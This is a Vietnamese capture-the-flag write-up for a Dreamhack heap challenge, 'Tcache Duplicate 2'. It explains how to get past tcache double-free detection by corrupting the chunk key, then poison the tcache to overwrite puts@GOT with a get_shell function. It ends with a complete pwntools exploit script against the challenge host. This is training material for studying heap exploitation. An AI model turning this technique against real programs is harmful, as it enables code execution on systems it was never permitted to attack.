# Challenge: Tcache Duplicate 2

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/tcache_dup2_chall/tcache_dup2)
- Chương trình khi thực thi như sau:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+0h] [rbp-10h] BYREF
  int index; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  index = 0;
  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Create heap");
      puts("2. Modify heap");
      puts("3. Delete heap");
      printf("> ");
      __isoc99_scanf("%d", &v3);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        create_heap(index++);
      }
      else if ( v3 == 2 )
      {
        modify_heap();
      }
    }
  }
}
```
- Trong đó, gồm 3 hàm được thực thi theo thứ tự input:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+0h] [rbp-10h] BYREF
  int index; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  index = 0;
  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Create heap");
      puts("2. Modify heap");
      puts("3. Delete heap");
      printf("> ");
      __isoc99_scanf("%d", &v3);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        create_heap(index++);
      }
      else if ( v3 == 2 )
      {
        modify_heap();
      }
    }
  }
}

unsigned __int64 modify_heap()
{
  size_t nbytes; // [rsp+8h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(40u);
  printf("idx: ");
  __isoc99_scanf("%ld", &v2);
  if ( v2 > 6 )
    exit(0);
  printf("Size: ");
  __isoc99_scanf("%ld", &nbytes);
  if ( nbytes > 0x10 )
    exit(0);
  printf("Data: ");
  read(0, *((void **)&ptr + v2), nbytes);
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 delete_heap()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%ld", &v1);
  if ( v1 > 6 )
    exit(0);
  if ( !*((_QWORD *)&ptr + v1) )
    exit(0);
  free(*((void **)&ptr + v1));
  return __readfsqword(0x28u) ^ v2;
}
```
- Khi dịch ngược, tôi thấy có hàm get_shell():
```
int get_shell()
{
  return system("/bin/sh");
}
```
- Checksec:
```
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ SHSTK:      Enabled
+ IBT:        Enabled
+ Stripped:   No
```

## Giải pháp
- Chall này tương tự như Tcache Duplicate trước tôi đã giải nhưng chall này không thể double free thẳng chunk A ngay lập tức như challenge trước.
```
└─$ ./tcache_dup2_patched
1. Create heap
2. Modify heap
3. Delete heap
> 1
Size: 200
Data: AAAA
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 0
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 0
free(): double free detected in tcache 2
Aborted                    ./tcache_dup2_patched
```
- Nhưng khi ta free chunk A và tạo chunk mới B rồi free lại chunk A thì chunk B lúc này đang giữ địa chỉ của chunk A trước đó vấn đề là khi free luôn chunk B ta lại bị báo lỗi double free.
```
└─$ ./tcache_dup2_patched
1. Create heap
2. Modify heap
3. Delete heap
> 1
Size: 200
Data: AAAA
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 0
1. Create heap
2. Modify heap
3. Delete heap
> 1
Size: 200
Data: BBBB
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 1
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 0
free(): double free detected in tcache 2
Aborted                    ./tcache_dup2_patched
```
- Nên để có thể khai thác double free thành công việc ta cần làm là thay đổi chunk+8 của chunk B thành giá trị bất kì để khi chương trình đọc chunk đang free khác với chunk+8 của chunk B thì ta sẽ khai thác được double free.
```
└─$ ./tcache_dup2_patched
1. Create heap
2. Modify heap
3. Delete heap
> 1
Size: 200
Data: AAAA
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 0
1. Create heap
2. Modify heap
3. Delete heap
> 1
Size: 200
Data: BBBB
1. Create heap
2. Modify heap
3. Delete heap
> 2
idx: 1
Size: 15
Data: CCCCCCCC
1. Create heap
2. Modify heap
3. Delete heap
> 3
idx: 1
1. Create heap
2. Modify heap
3. Delete heap
>

pwndbg> bins
tcachebins
0xd0 [  2]:  0x4052a0 ◂— 0x4052a0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
```
> Tận dụng bug này ta sẽ overwrite puts.got thành get_shell() để khi call puts.plt lần nữa ta sẽ có được shell.

## Quá trình
- Trước tiên, ta cần khai thác double free để có thể overwrite puts.got thành get_shell(). Như tôi giải thích bên trên, thì để có thể double được bài này ta cần free(chunk A) sau đó malloc(chunk B) rồi free(chunk A) và tcache, để chunk B có thể free được mà không bị double free ta cần thay đổi chunk+8 của chunk B bằng modify(chunk B) rồi mới free(chunk B).
```
create(9, b'A')
delete(0)
create(9, b'B')
delete(0)
modify(1, 15, b'A'*8)
delete(1)
```
- Vấn đề là trong tcache, idx của tcache là 2 thì khi mà malloc(puts.got) và lấy chunk A thừa ra để tcache còn lại là puts.got, lúc này idx của tcache là 0 nên khi malloc(get_shell) giống challenge trước đó sẽ không overwrite được puts.got vì idx của tcache không còn để có thể lấy puts.got ra mà malloc() nữa. Để giải quyết ta cần free() thêm 1 chunk giống chunk A nữa.
```
modify(1, 15, b'A'*8)
delete(1)
```
- Thì lúc này idx của tcache là 3 khi malloc(puts.got) và lấy chunk A thừa ra. Tcache còn lại là puts.got và idx tcache vẫn còn 1 để khi malloc(get_shelL) ta có thể lấy địa chỉ puts.got ra và overwrite nó thành get_shell().
```
create(9, p64(exe.got['puts']))
create(9, b'A')
create(9, p64(exe.sym['get_shell']))
```
> Chương trình thực thi puts.plt lần nữa sẽ call get_shell() và ta có được shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('tcache_dup2_patched', checksec=False)
libc = ELF('libc-2.30.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+116
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 15773)
else:
    p = process([exe.path])
GDB()

def create(size, data):
    slna(b'> ', 1)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def modify(idx, size, data):
    slna(b'> ', 2)
    slna(b'idx: ', idx)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def delete(idx):
    slna(b'> ', 3)
    slna(b'idx: ', idx)

create(9, b'A')
delete(0)
create(9, b'B')
delete(0)
modify(1, 15, b'A'*8)
delete(1)
modify(1, 15, b'A'*8)
delete(1)
create(9, p64(exe.got['puts']))
create(9, b'A')
create(9, p64(exe.sym['get_shell']))

p.interactive()
```
